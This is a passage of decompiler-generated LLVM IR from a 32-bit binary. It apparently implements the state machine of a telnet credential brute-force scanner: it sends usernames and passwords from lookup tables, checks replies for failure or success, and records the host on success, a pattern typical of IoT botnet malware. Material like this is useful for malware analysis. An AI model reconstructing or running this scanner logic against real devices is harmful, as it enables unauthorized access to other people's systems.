  %v2_804a865 = inttoptr i32 %v1_804a865 to i32*
  store i32 0, i32* %v2_804a865, align 4
  %v0_804a867 = load i32, i32* %stack_var_-332, align 4
  %v1_804a867 = inttoptr i32 %v0_804a867 to i32*
  %v2_804a867 = call i32 @__GI_time(i32* %v1_804a867)
  store i32 %v2_804a867, i32* %eax.global-to-local, align 4
  %v0_804a86f = load i32, i32* @ebx, align 4
  %v7_804a86f = icmp ult i32 %v0_804a86f, %v2_804a867
  %v1_804a871 = icmp eq i1 %v7_804a86f, false
  br i1 %v1_804a871, label %dec_label_pc_804b063, label %dec_label_pc_804a877

dec_label_pc_804a877:                             ; preds = %dec_label_pc_804a842
  %v0_804a86c = load i32, i32* @esp, align 4
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v3_804a893 = inttoptr i32 %v0_804a86c to i32*
  store i32 %v2_804a174, i32* %v3_804a893, align 4
  %v0_804a894 = load i32, i32* %stack_var_-332, align 4
  %v1_804a894 = call i32 @reset_telstate(i32 %v0_804a894)
  store i32 %v1_804a894, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b063

dec_label_pc_804a8a1:                             ; preds = %dec_label_pc_804a1ad
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804a8b7 = add i32 %v2_804a32f, %v2_804a172
  %v4_804a8b7 = inttoptr i32 %v3_804a8b7 to i8*
  %v5_804a8b7 = load i8, i8* %v4_804a8b7, align 2
  %v6_804a8b7 = zext i8 %v5_804a8b7 to i32
  store i32 %v6_804a8b7, i32* %eax.global-to-local, align 4
  %v1_804a8c0 = mul nuw nsw i32 %v6_804a8b7, 4
  %v2_804a8c0 = add nuw nsw i32 %v1_804a8c0, 134582816
  %v3_804a8c0 = inttoptr i32 %v2_804a8c0 to i32*
  %v4_804a8c0 = load i32, i32* %v3_804a8c0, align 4
  %v1_804a8d2 = and i32 %v4_804a8c0, -256
  store i32 %v1_804a8d2, i32* %eax.global-to-local, align 4
  %v4_804a8d5 = inttoptr i32 %v4_804a8c0 to i8*
  store i32 %v4_804a8c0, i32* @edi, align 4
  %v3_804a8db = call i32 @_strlen(i8* %v4_804a8d5)
  store i32 %v3_804a8db, i32* @esi, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v5_804a8fa = load i8, i8* %v4_804a8b7, align 2
  %v6_804a8fa = zext i8 %v5_804a8fa to i32
  store i32 %v6_804a8fa, i32* %eax.global-to-local, align 4
  %v1_804a903 = mul nuw nsw i32 %v6_804a8fa, 4
  %v2_804a903 = add nuw nsw i32 %v1_804a903, 134582816
  %v3_804a903 = inttoptr i32 %v2_804a903 to i32*
  %v4_804a903 = load i32, i32* %v3_804a903, align 4
  store i32 %v4_804a903, i32* @ebx, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804a920 = inttoptr i32 %v2_804a174 to i32*
  %v4_804a920 = load i32, i32* %v3_804a920, align 4
  store i32 %v4_804a920, i32* %eax.global-to-local, align 4
  %v0_804a923 = load i32, i32* @esp, align 4
  %v1_804a923 = add i32 %v0_804a923, -4
  %v2_804a923 = inttoptr i32 %v1_804a923 to i32*
  store i32 16384, i32* %v2_804a923, align 4
  %v0_804a928 = load i32, i32* @esi, align 4
  %v2_804a928 = add i32 %v0_804a923, -8
  %v3_804a928 = inttoptr i32 %v2_804a928 to i32*
  store i32 %v0_804a928, i32* %v3_804a928, align 4
  %v0_804a929 = load i32, i32* @ebx, align 4
  %v2_804a929 = add i32 %v0_804a923, -12
  %v3_804a929 = inttoptr i32 %v2_804a929 to i32*
  store i32 %v0_804a929, i32* %v3_804a929, align 4
  %v0_804a92a = load i32, i32* %eax.global-to-local, align 4
  %v2_804a92a = add i32 %v0_804a923, -16
  %v3_804a92a = inttoptr i32 %v2_804a92a to i32*
  store i32 %v0_804a92a, i32* %v3_804a92a, align 4
  %v4_804a92b = call i32 @__libc_send(i32 %v4_804a8c0, i32 %v2_804a07d, i32 %v6_804a1c3, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804a92b, i32* %eax.global-to-local, align 4
  %v0_804a930 = load i32, i32* @esp, align 4
  %v2_804a933 = icmp slt i32 %v4_804a92b, 0
  %v1_804a935 = icmp eq i1 %v2_804a933, false
  store i32 %v1_804a164, i32* @edx, align 4
  br i1 %v1_804a935, label %dec_label_pc_804a961, label %dec_label_pc_804a937

dec_label_pc_804a937:                             ; preds = %dec_label_pc_804a8a1
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v3_804a953 = inttoptr i32 %v0_804a930 to i32*
  store i32 %v2_804a174, i32* %v3_804a953, align 4
  %v1_804a954 = call i32 @reset_telstate(i32 %v4_804a8c0)
  store i32 %v1_804a954, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b063

dec_label_pc_804a961:                             ; preds = %dec_label_pc_804a8a1
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v4_804a977 = load i32, i32* %v3_804a920, align 4
  store i32 %v4_804a977, i32* %eax.global-to-local, align 4
  %v1_804a97a = add i32 %v0_804a930, 12
  %v2_804a97a = inttoptr i32 %v1_804a97a to i32*
  store i32 16384, i32* %v2_804a97a, align 4
  %v1_804a97f = add i32 %v0_804a930, 8
  %v2_804a97f = inttoptr i32 %v1_804a97f to i32*
  store i32 2, i32* %v2_804a97f, align 4
  %v1_804a981 = add i32 %v0_804a930, 4
  %v2_804a981 = inttoptr i32 %v1_804a981 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80561b8.57 to i32), i32* %v2_804a981, align 4
  %v0_804a986 = load i32, i32* %eax.global-to-local, align 4
  %v3_804a986 = inttoptr i32 %v0_804a930 to i32*
  store i32 %v0_804a986, i32* %v3_804a986, align 4
  %v4_804a987 = call i32 @__libc_send(i32 %v4_804a8c0, i32 %v2_804a07d, i32 %v6_804a1c3, i32 ptrtoint (i32* @0 to i32))
  %v0_804a98c = load i32, i32* @esp, align 4
  %v2_804a98f = icmp slt i32 %v4_804a987, 0
  %v1_804a991 = icmp eq i1 %v2_804a98f, false
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  br i1 %v1_804a991, label %dec_label_pc_804a9bd, label %dec_label_pc_804a993

dec_label_pc_804a993:                             ; preds = %dec_label_pc_804a961
  %v3_804a9af = inttoptr i32 %v0_804a98c to i32*
  store i32 %v2_804a174, i32* %v3_804a9af, align 4
  %v1_804a9b0 = call i32 @reset_telstate(i32 %v4_804a8c0)
  store i32 %v1_804a9b0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b063

dec_label_pc_804a9bd:                             ; preds = %dec_label_pc_804a961
  %v1_804a9d9 = add i32 %v0_804a98c, 4
  %v2_804a9d9 = inttoptr i32 %v1_804a9d9 to i32*
  store i32 4, i32* %v2_804a9d9, align 4
  %v0_804a9db = load i32, i32* %eax.global-to-local, align 4
  %v3_804a9db = inttoptr i32 %v0_804a98c to i32*
  store i32 %v0_804a9db, i32* %v3_804a9db, align 4
  %v2_804a9dc = inttoptr i32 %v4_804a8c0 to i32*
  %v3_804a9dc = call i32 @advance_state(i32* %v2_804a9dc, i32 %v2_804a07d)
  store i32 %v3_804a9dc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b063

dec_label_pc_804a9e9:                             ; preds = %dec_label_pc_804a1ad
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  %v1_804aa01 = add i32 %v2_804a174, 24
  store i32 %v1_804aa01, i32* %eax.global-to-local, align 4
  %v1_804aa04 = inttoptr i32 %v1_804aa01 to i32*
  %v2_804aa04 = load i32, i32* %v1_804aa04, align 4
  store i32 %v2_804aa04, i32* @ebx, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804aa1c = inttoptr i32 %v2_804a174 to i32*
  %v4_804aa1c = load i32, i32* %v3_804aa1c, align 4
  store i32 %v4_804aa1c, i32* %eax.global-to-local, align 4
  %v0_804aa1f = load i32, i32* @esp, align 4
  %v1_804aa22 = add i32 %v0_804aa1f, -16
  %v2_804aa22 = inttoptr i32 %v1_804aa22 to i32*
  store i32 ptrtoint (i32* @global_var_80597cc to i32), i32* %v2_804aa22, align 4
  %v1_804aa27 = add i32 %v0_804aa1f, -20
  %v2_804aa27 = inttoptr i32 %v1_804aa27 to i32*
  store i32 1024, i32* %v2_804aa27, align 4
  %v0_804aa2c = load i32, i32* @ebx, align 4
  %v2_804aa2c = add i32 %v0_804aa1f, -24
  %v3_804aa2c = inttoptr i32 %v2_804aa2c to i32*
  store i32 %v0_804aa2c, i32* %v3_804aa2c, align 4
  %v5_804aa2d = add i32 %v0_804aa1f, -28
  %v6_804aa2d = inttoptr i32 %v5_804aa2d to i32*
  store i32 %arg1, i32* %v6_804aa2d, align 4
  %v0_804aa30 = load i32, i32* %eax.global-to-local, align 4
  %v2_804aa30 = add i32 %v0_804aa1f, -32
  %v3_804aa30 = inttoptr i32 %v2_804aa30 to i32*
  store i32 %v0_804aa30, i32* %v3_804aa30, align 4
  %v1_804aa31 = call i32 @read_until_response(i32 %v6_804a1c3)
  %v0_804aa36 = load i32, i32* @esp, align 4
  %v1_804aa39 = icmp eq i32 %v1_804aa31, 0
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  br i1 %v1_804aa39, label %dec_label_pc_804aac6, label %dec_label_pc_804aa41

dec_label_pc_804aa41:                             ; preds = %dec_label_pc_804a9e9
  store i32 %v1_804aa01, i32* %eax.global-to-local, align 4
  %v2_804aa5c = load i32, i32* %v1_804aa04, align 4
  store i32 %v2_804aa5c, i32* %eax.global-to-local, align 4
  %v2_804aa61 = add i32 %v0_804aa36, 16
  %v3_804aa61 = inttoptr i32 %v2_804aa61 to i32*
  store i32 %v2_804aa5c, i32* %v3_804aa61, align 4
  %v1_804aa62 = call i32 @contains_fail(i32 %stack_var_-620.244)
  %v0_804aa67 = load i32, i32* @esp, align 4
  %v1_804aa6a = icmp eq i32 %v1_804aa62, 0
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v1_804aab6 = add i32 %v0_804aa67, 4
  %v2_804aab6 = inttoptr i32 %v1_804aab6 to i32*
  br i1 %v1_804aa6a, label %dec_label_pc_804aa9a, label %dec_label_pc_804aa6e

dec_label_pc_804aa6e:                             ; preds = %dec_label_pc_804aa41
  store i32 0, i32* %v2_804aab6, align 4
  %v0_804aa8c = load i32, i32* %eax.global-to-local, align 4
  %v3_804aa8c = inttoptr i32 %v0_804aa67 to i32*
  store i32 %v0_804aa8c, i32* %v3_804aa8c, align 4
  %v2_804aa8d = inttoptr i32 %stack_var_-620.244 to i32*
  %v3_804aa8d = call i32 @advance_state(i32* %v2_804aa8d, i32 %v2_804a07d)
  store i32 %v3_804aa8d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b063

dec_label_pc_804aa9a:                             ; preds = %dec_label_pc_804aa41
  store i32 5, i32* %v2_804aab6, align 4
  %v0_804aab8 = load i32, i32* %eax.global-to-local, align 4
  %v3_804aab8 = inttoptr i32 %v0_804aa67 to i32*
  store i32 %v0_804aab8, i32* %v3_804aab8, align 4
  %v2_804aab9 = inttoptr i32 %stack_var_-620.244 to i32*
  %v3_804aab9 = call i32 @advance_state(i32* %v2_804aab9, i32 %v2_804a07d)
  store i32 %v3_804aab9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b063

dec_label_pc_804aac6:                             ; preds = %dec_label_pc_804a9e9
  store i32 %v1_804a176, i32* %eax.global-to-local, align 4
  %v2_804aae1 = load i32, i32* %v1_804a179, align 4
  store i32 %v2_804aae1, i32* %eax.global-to-local, align 4
  %v1_804aae3 = add i32 %v2_804aae1, 3
  store i32 %v1_804aae3, i32* @ebx, align 4
  %v1_804aae9 = add i32 %v0_804aa36, 16
  %v2_804aae9 = inttoptr i32 %v1_804aae9 to i32*
  store i32 0, i32* %v2_804aae9, align 4
  %v1_804aaeb = inttoptr i32 %stack_var_-620.244 to i32*
  %v2_804aaeb = call i32 @__GI_time(i32* %v1_804aaeb)
  store i32 %v2_804aaeb, i32* %eax.global-to-local, align 4
  %v0_804aaf3 = load i32, i32* @ebx, align 4
  %v7_804aaf3 = icmp ult i32 %v0_804aaf3, %v2_804aaeb
  %v1_804aaf5 = icmp eq i1 %v7_804aaf3, false
  br i1 %v1_804aaf5, label %dec_label_pc_804b063, label %dec_label_pc_804aafb

dec_label_pc_804aafb:                             ; preds = %dec_label_pc_804aac6
  %v0_804aaf0 = load i32, i32* @esp, align 4
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v3_804ab17 = inttoptr i32 %v0_804aaf0 to i32*
  store i32 %v2_804a174, i32* %v3_804ab17, align 4
  %v1_804ab18 = call i32 @reset_telstate(i32 %stack_var_-620.244)
  store i32 %v1_804ab18, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b063

dec_label_pc_804ab25:                             ; preds = %dec_label_pc_804a1ad
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804ab3b = add i32 %v2_804a2f5, %v2_804a172
  %v4_804ab3b = inttoptr i32 %v3_804ab3b to i8*
  %v5_804ab3b = load i8, i8* %v4_804ab3b, align 1
  %v6_804ab3b = zext i8 %v5_804ab3b to i32
  store i32 %v6_804ab3b, i32* %eax.global-to-local, align 4
  %v1_804ab44 = mul nuw nsw i32 %v6_804ab3b, 4
  %v2_804ab44 = add nuw nsw i32 %v1_804ab44, 134582880
  %v3_804ab44 = inttoptr i32 %v2_804ab44 to i32*
  %v4_804ab44 = load i32, i32* %v3_804ab44, align 4
  %v1_804ab56 = and i32 %v4_804ab44, -256
  store i32 %v1_804ab56, i32* %eax.global-to-local, align 4
  %v4_804ab59 = inttoptr i32 %v4_804ab44 to i8*
  store i32 %v4_804ab44, i32* @edi, align 4
  %v3_804ab5f = call i32 @_strlen(i8* %v4_804ab59)
  store i32 %v3_804ab5f, i32* @esi, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v5_804ab7e = load i8, i8* %v4_804ab3b, align 1
  %v6_804ab7e = zext i8 %v5_804ab7e to i32
  store i32 %v6_804ab7e, i32* %eax.global-to-local, align 4
  %v1_804ab87 = mul nuw nsw i32 %v6_804ab7e, 4
  %v2_804ab87 = add nuw nsw i32 %v1_804ab87, 134582880
  %v3_804ab87 = inttoptr i32 %v2_804ab87 to i32*
  %v4_804ab87 = load i32, i32* %v3_804ab87, align 4
  store i32 %v4_804ab87, i32* @ebx, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804aba4 = inttoptr i32 %v2_804a174 to i32*
  %v4_804aba4 = load i32, i32* %v3_804aba4, align 4
  store i32 %v4_804aba4, i32* %eax.global-to-local, align 4
  %v0_804aba7 = load i32, i32* @esp, align 4
  %v1_804aba7 = add i32 %v0_804aba7, -4
  %v2_804aba7 = inttoptr i32 %v1_804aba7 to i32*
  store i32 16384, i32* %v2_804aba7, align 4
  %v0_804abac = load i32, i32* @esi, align 4
  %v2_804abac = add i32 %v0_804aba7, -8
  %v3_804abac = inttoptr i32 %v2_804abac to i32*
  store i32 %v0_804abac, i32* %v3_804abac, align 4
  %v0_804abad = load i32, i32* @ebx, align 4
  %v2_804abad = add i32 %v0_804aba7, -12
  %v3_804abad = inttoptr i32 %v2_804abad to i32*
  store i32 %v0_804abad, i32* %v3_804abad, align 4
  %v0_804abae = load i32, i32* %eax.global-to-local, align 4
  %v2_804abae = add i32 %v0_804aba7, -16
  %v3_804abae = inttoptr i32 %v2_804abae to i32*
  store i32 %v0_804abae, i32* %v3_804abae, align 4
  %v4_804abaf = call i32 @__libc_send(i32 %v4_804ab44, i32 %stack_var_-620.244, i32 %v2_804a07d, i32 %v6_804a1c3)
  store i32 %v4_804abaf, i32* %eax.global-to-local, align 4
  %v0_804abb4 = load i32, i32* @esp, align 4
  %v2_804abb7 = icmp slt i32 %v4_804abaf, 0
  %v1_804abb9 = icmp eq i1 %v2_804abb7, false
  store i32 %v1_804a164, i32* @edx, align 4
  br i1 %v1_804abb9, label %dec_label_pc_804abe5, label %dec_label_pc_804abbb

dec_label_pc_804abbb:                             ; preds = %dec_label_pc_804ab25
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v3_804abd7 = inttoptr i32 %v0_804abb4 to i32*
  store i32 %v2_804a174, i32* %v3_804abd7, align 4
  %v1_804abd8 = call i32 @reset_telstate(i32 %v4_804ab44)
  store i32 %v1_804abd8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b063

dec_label_pc_804abe5:                             ; preds = %dec_label_pc_804ab25
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v4_804abfb = load i32, i32* %v3_804aba4, align 4
  store i32 %v4_804abfb, i32* %eax.global-to-local, align 4
  %v1_804abfe = add i32 %v0_804abb4, 12
  %v2_804abfe = inttoptr i32 %v1_804abfe to i32*
  store i32 16384, i32* %v2_804abfe, align 4
  %v1_804ac03 = add i32 %v0_804abb4, 8
  %v2_804ac03 = inttoptr i32 %v1_804ac03 to i32*
  store i32 2, i32* %v2_804ac03, align 4
  %v1_804ac05 = add i32 %v0_804abb4, 4
  %v2_804ac05 = inttoptr i32 %v1_804ac05 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80561b8.57 to i32), i32* %v2_804ac05, align 4
  %v0_804ac0a = load i32, i32* %eax.global-to-local, align 4
  %v3_804ac0a = inttoptr i32 %v0_804abb4 to i32*
  store i32 %v0_804ac0a, i32* %v3_804ac0a, align 4
  %v4_804ac0b = call i32 @__libc_send(i32 %v4_804ab44, i32 %stack_var_-620.244, i32 %v2_804a07d, i32 %v6_804a1c3)
  %v0_804ac10 = load i32, i32* @esp, align 4
  %v2_804ac13 = icmp slt i32 %v4_804ac0b, 0
  %v1_804ac15 = icmp eq i1 %v2_804ac13, false
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  br i1 %v1_804ac15, label %dec_label_pc_804ac41, label %dec_label_pc_804ac17

dec_label_pc_804ac17:                             ; preds = %dec_label_pc_804abe5
  %v3_804ac33 = inttoptr i32 %v0_804ac10 to i32*
  store i32 %v2_804a174, i32* %v3_804ac33, align 4
  %v1_804ac34 = call i32 @reset_telstate(i32 %v4_804ab44)
  store i32 %v1_804ac34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b063

dec_label_pc_804ac41:                             ; preds = %dec_label_pc_804abe5
  %v1_804ac5d = add i32 %v0_804ac10, 4
  %v2_804ac5d = inttoptr i32 %v1_804ac5d to i32*
  store i32 6, i32* %v2_804ac5d, align 4
  %v0_804ac5f = load i32, i32* %eax.global-to-local, align 4
  %v3_804ac5f = inttoptr i32 %v0_804ac10 to i32*
  store i32 %v0_804ac5f, i32* %v3_804ac5f, align 4
  %v2_804ac60 = inttoptr i32 %v4_804ab44 to i32*
  %v3_804ac60 = call i32 @advance_state(i32* %v2_804ac60, i32 %stack_var_-620.244)
  store i32 %v3_804ac60, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b063

dec_label_pc_804ac6d:                             ; preds = %dec_label_pc_804a1ad
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  %v1_804ac85 = add i32 %v2_804a174, 24
  store i32 %v1_804ac85, i32* %eax.global-to-local, align 4
  %v1_804ac88 = inttoptr i32 %v1_804ac85 to i32*
  %v2_804ac88 = load i32, i32* %v1_804ac88, align 4
  store i32 %v2_804ac88, i32* @ebx, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804aca0 = inttoptr i32 %v2_804a174 to i32*
  %v4_804aca0 = load i32, i32* %v3_804aca0, align 4
  store i32 %v4_804aca0, i32* %eax.global-to-local, align 4
  %v0_804aca3 = load i32, i32* @esp, align 4
  %v1_804aca6 = add i32 %v0_804aca3, -16
  %v2_804aca6 = inttoptr i32 %v1_804aca6 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_8059820.58 to i32), i32* %v2_804aca6, align 4
  %v1_804acab = add i32 %v0_804aca3, -20
  %v2_804acab = inttoptr i32 %v1_804acab to i32*
  store i32 1024, i32* %v2_804acab, align 4
  %v0_804acb0 = load i32, i32* @ebx, align 4
  %v2_804acb0 = add i32 %v0_804aca3, -24
  %v3_804acb0 = inttoptr i32 %v2_804acb0 to i32*
  store i32 %v0_804acb0, i32* %v3_804acb0, align 4
  %v5_804acb1 = add i32 %v0_804aca3, -28
  %v6_804acb1 = inttoptr i32 %v5_804acb1 to i32*
  store i32 %arg1, i32* %v6_804acb1, align 4
  %v0_804acb4 = load i32, i32* %eax.global-to-local, align 4
  %v2_804acb4 = add i32 %v0_804aca3, -32
  %v3_804acb4 = inttoptr i32 %v2_804acb4 to i32*
  store i32 %v0_804acb4, i32* %v3_804acb4, align 4
  %v1_804acb5 = call i32 @read_until_response(i32 %v6_804a1c3)
  store i32 %v1_804acb5, i32* %eax.global-to-local, align 4
  %v0_804acba = load i32, i32* @esp, align 4
  %v1_804acbd = icmp eq i32 %v1_804acb5, 0
  br i1 %v1_804acbd, label %dec_label_pc_804aea8, label %dec_label_pc_804acc5

dec_label_pc_804acc5:                             ; preds = %dec_label_pc_804ac6d
  store i32 %storemerge45, i32* @ebx, align 4
  %v1_804accb = add i32 %v0_804acba, 16
  %v2_804accb = inttoptr i32 %v1_804accb to i32*
  store i32 0, i32* %v2_804accb, align 4
  %v1_804accd = inttoptr i32 %stack_var_-624.243 to i32*
  %v2_804accd = call i32 @__GI_time(i32* %v1_804accd)
  store i32 %v2_804accd, i32* @esi, align 4
  %v0_804acda = load i32, i32* @ebx, align 4
  %v2_804acea = mul i32 %v0_804acda, 28
  %v1_804acee = add i32 %v2_804acec, %v2_804acea
  %v2_804acf1 = inttoptr i32 %v1_804acee to i32*
  store i32 %v2_804accd, i32* %v2_804acf1, align 4
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v1_804ac85, i32* %eax.global-to-local, align 4
  %v2_804ad0e = load i32, i32* %v1_804ac88, align 4
  store i32 %v2_804ad0e, i32* %eax.global-to-local, align 4
  %v0_804ad10 = load i32, i32* @esp, align 4
  %v2_804ad13 = add i32 %v0_804ad10, -16
  %v3_804ad13 = inttoptr i32 %v2_804ad13 to i32*
  store i32 %v2_804ad0e, i32* %v3_804ad13, align 4
  %v1_804ad14 = call i32 @contains_fail(i32 %stack_var_-624.243)
  store i32 %v1_804ad14, i32* %eax.global-to-local, align 4
  %v0_804ad19 = load i32, i32* @esp, align 4
  %v1_804ad1c = icmp eq i32 %v1_804ad14, 0
  store i32 %v1_804a164, i32* @edx, align 4
  br i1 %v1_804ad1c, label %dec_label_pc_804ad4c, label %dec_label_pc_804ad20

dec_label_pc_804ad20:                             ; preds = %dec_label_pc_804acc5
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v1_804ad3c = add i32 %v0_804ad19, 4
  %v2_804ad3c = inttoptr i32 %v1_804ad3c to i32*
  store i32 0, i32* %v2_804ad3c, align 4
  %v0_804ad3e = load i32, i32* %eax.global-to-local, align 4
  %v3_804ad3e = inttoptr i32 %v0_804ad19 to i32*
  store i32 %v0_804ad3e, i32* %v3_804ad3e, align 4
  %v3_804ad3f = call i32 @advance_state(i32* %v1_804accd, i32 %stack_var_-620.244)
  store i32 %v3_804ad3f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b063

dec_label_pc_804ad4c:                             ; preds = %dec_label_pc_804acc5
  store i32 %v1_804ac85, i32* %eax.global-to-local, align 4
  %v2_804ad67 = load i32, i32* %v1_804ac88, align 4
  store i32 %v2_804ad67, i32* %eax.global-to-local, align 4
  %v3_804ad6c = inttoptr i32 %v0_804ad19 to i32*
  store i32 %v2_804ad67, i32* %v3_804ad6c, align 4
  %v1_804ad6d = call i32 @contains_success(i32 %stack_var_-624.243)
  store i32 %v1_804ad6d, i32* %eax.global-to-local, align 4
  %v0_804ad72 = load i32, i32* @esp, align 4
  %v1_804ad75 = icmp eq i32 %v1_804ad6d, 0
  store i32 %v1_804a164, i32* @edx, align 4
  br i1 %v1_804ad75, label %dec_label_pc_804ae7e, label %dec_label_pc_804ad7d

dec_label_pc_804ad7d:                             ; preds = %dec_label_pc_804ad4c
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804ad93 = add i32 %v2_804a206, %v2_804a172
  %v4_804ad93 = inttoptr i32 %v3_804ad93 to i8*
  %v5_804ad93 = load i8, i8* %v4_804ad93, align 1
  %v6_804ad93 = zext i8 %v5_804ad93 to i32
  %v9_804ad93 = or i32 %v6_804ad93, %v8_804a1c3
  store i32 %v9_804ad93, i32* %eax.global-to-local, align 4
  %v10_804ad97 = icmp eq i8 %v5_804ad93, 2
  %v1_804ad99 = icmp eq i1 %v10_804ad97, false
  store i32 %v1_804a164, i32* @edx, align 4
  br i1 %v1_804ad99, label %dec_label_pc_804adc7, label %dec_label_pc_804ad9b

dec_label_pc_804ad9b:                             ; preds = %dec_label_pc_804ad7d
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v1_804adb7 = add i32 %v0_804ad72, 4
  %v2_804adb7 = inttoptr i32 %v1_804adb7 to i32*
  store i32 7, i32* %v2_804adb7, align 4
  %v0_804adb9 = load i32, i32* %eax.global-to-local, align 4
  %v3_804adb9 = inttoptr i32 %v0_804ad72 to i32*
  store i32 %v0_804adb9, i32* %v3_804adb9, align 4
  %v3_804adba = call i32 @advance_state(i32* %v1_804accd, i32 %stack_var_-620.244)
  store i32 %v3_804adba, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b063

dec_label_pc_804adc7:                             ; preds = %dec_label_pc_804ad7d
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804addd = add i32 %v2_804a2f5, %v2_804a172
  %v4_804addd = inttoptr i32 %v3_804addd to i8*
  %v5_804addd = load i8, i8* %v4_804addd, align 1
  %v6_804addd = zext i8 %v5_804addd to i32
  store i32 %v6_804addd, i32* %eax.global-to-local, align 4
  %v1_804ade6 = mul nuw nsw i32 %v6_804addd, 4
  %v2_804ade6 = add nuw nsw i32 %v1_804ade6, 134582880
  %v3_804ade6 = inttoptr i32 %v2_804ade6 to i32*
  %v4_804ade6 = load i32, i32* %v3_804ade6, align 4
  store i32 %v4_804ade6, i32* @ebx, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804ae03 = add i32 %v2_804a32f, %v2_804a172
  %v4_804ae03 = inttoptr i32 %v3_804ae03 to i8*
  %v5_804ae03 = load i8, i8* %v4_804ae03, align 2
  %v6_804ae03 = zext i8 %v5_804ae03 to i32
  store i32 %v6_804ae03, i32* %eax.global-to-local, align 4
  %v1_804ae0c = mul nuw nsw i32 %v6_804ae03, 4
  %v2_804ae0c = add nuw nsw i32 %v1_804ae0c, 134582816
  %v3_804ae0c = inttoptr i32 %v2_804ae0c to i32*
  %v4_804ae0c = load i32, i32* %v3_804ae0c, align 4
  store i32 %v4_804ae0c, i32* @esi, align 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v3_804ae2f = inttoptr i32 %v0_804ad72 to i32*
  store i32 %v2_804a174, i32* %v3_804ae2f, align 4
  %v0_804ae30 = call i32 @get_telstate_host()
  store i32 %v0_804ae30, i32* %eax.global-to-local, align 4
  %v0_804ae35 = load i32, i32* @esp, align 4
  %v0_804ae38 = load i32, i32* @global_var_8059b00.18, align 256
  store i32 %v0_804ae38, i32* %edx.global-to-local, align 4
  %v0_804ae41 = load i32, i32* @ebx, align 4
  %v3_804ae41 = inttoptr i32 %v0_804ae35 to i32*
  store i32 %v0_804ae41, i32* %v3_804ae41, align 4
  %v0_804ae42 = load i32, i32* @esi, align 4
  %v2_804ae42 = add i32 %v0_804ae35, -4
  %v3_804ae42 = inttoptr i32 %v2_804ae42 to i32*
  store i32 %v0_804ae42, i32* %v3_804ae42, align 4
  %v2_804ae43 = add i32 %v0_804ae35, -8
  %v3_804ae43 = inttoptr i32 %v2_804ae43 to i32*
  store i32 %v0_804ae30, i32* %v3_804ae43, align 4
  %v1_804ae44 = add i32 %v0_804ae35, -12
  %v2_804ae44 = inttoptr i32 %v1_804ae44 to i32*
  store i32 ptrtoint (i32* @global_var_80561bc.59 to i32), i32* %v2_804ae44, align 4
  %v0_804ae49 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ae49 = add i32 %v0_804ae35, -16
  %v3_804ae49 = inttoptr i32 %v2_804ae49 to i32*
  store i32 %v0_804ae49, i32* %v3_804ae49, align 4
  %v2_804ae4a = call i32 @Rootsprintf(i32 %stack_var_-624.243, i32 %stack_var_-620.244)
  %v0_804ae4f = load i32, i32* @esp, align 4
  store i32 %v1_804a164, i32* @edx, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  %v1_804ae6e = add i32 %v0_804ae4f, 20
  %v2_804ae6e = inttoptr i32 %v1_804ae6e to i32*
  store i32 7, i32* %v2_804ae6e, align 4
